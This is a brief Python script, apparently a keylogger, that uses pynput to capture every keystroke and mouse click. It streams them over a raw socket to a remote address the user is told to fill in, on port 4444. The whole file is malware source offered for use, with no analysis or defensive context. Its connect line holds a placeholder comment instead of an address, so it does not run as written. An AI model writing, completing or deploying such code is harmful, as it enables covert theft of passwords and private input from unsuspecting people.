from pynput import keyboard , mouse 
from _thread import start_new_thread
from colorama import Fore , init
import socket
init()

s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.connect(( #enter your ip  , 4444))

#############################################

def mouse_click( x , y , button , pressed ):
    if pressed == True :
        s.send(f"m {x} : {y} : {button}   {pressed} \n ".encode())

#############################################

def keyboard_press(key):
    try :
        key =f"k{key.char}"
        s.send(key.encode())
        
    
    except AttributeError:
        
        key =f"k {key} "
        s.send(str(key).encode())
###############################################

def mouse_log(v) :
    with mouse.Listener(on_click = mouse_click) as lst :
        lst.join()

###############################################

def keyboard_log(v):
    with keyboard.Listener(on_press = keyboard_press) as lst :
        lst.join()

##############################################

#mouse_log()
start_new_thread(mouse_log,tuple([1]))
#keyboard_log()
start_new_thread(keyboard_log,tuple([2]))

while True:
    pass